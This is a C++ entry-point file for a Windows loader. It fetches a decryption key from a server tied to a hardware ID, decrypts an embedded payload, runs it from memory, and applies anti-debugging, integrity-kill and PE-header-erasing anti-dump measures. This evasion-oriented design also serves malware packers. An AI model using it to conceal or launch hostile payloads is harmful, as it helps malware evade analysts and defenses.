#include "pch.h"

#include "AntiDebugging.hpp"
#include "AntiDumping.hpp"
#include "ServerRequests.hpp"
#include "PayloadManager.hpp"
#include "Identification.hpp"
#include "RunProcess.hpp"

#ifndef _DEBUG
// IF RELEASE
#pragma optimize("x", on)
#endif // !_DEBUG


int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {

#ifdef _DEBUG
    // Instanciate console so I can log things through cout
    FILE* cmdOut;
    AllocConsole();
    freopen_s(&cmdOut, "CONOUT$", "w", stdout); // only output no input
    cout << "-------------- Debug mode --------------" << endl;
#endif // _DEBUG


    // Init Antidebugging
    AntiDebugging antiDbg;
    antiDbg.start();

    antiDbg.KillIfIntegrityCheckFails();
    PayloadManager* payloadManager = new PayloadManager();


    antiDbg.KillIfIntegrityCheckFails();
    string response = ServerRequests::GetDecryptKey(payloadManager->GetProjectId(), Identification::GetHWID());

    // Error handling
    if (response.length() <= 0) {
#ifdef _DEBUG
        cout << "HTTP Response \" \"" << endl;
#endif // _DEBUG
        exit(-6);
    };


    antiDbg.KillIfIntegrityCheckFails();
    vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);

#ifdef _DEBUG
    cout << "First 3 bytes of decrypted payload: " << dPayload->data()[0] << dPayload->data()[1] << dPayload->data()[2] << endl;
#endif // _DEBUG

    antiDbg.KillIfIntegrityCheckFails();
    RunProcess* runProcess = new RunProcess();
    runProcess->RunProcessFromMemory(dPayload, payloadManager->GetOEP());

    thread checkIntegrity = thread([&antiDbg]() {
        while (true) {
            antiDbg.KillIfIntegrityCheckFails();
            Sleep(1000);
        }
    });


    // Delete own PE header
    AntiDumping::DeletePEHeader();

    // Clear memory
    delete payloadManager;
    delete runProcess;

    // Wait for thread to finish
    checkIntegrity.join();

#ifdef _DEBUG
    cout << "-------------- Exit --------------" << endl;
    // Clear console
    fclose(cmdOut);
    FreeConsole();
#endif // _DEBUG

    return 0;

}
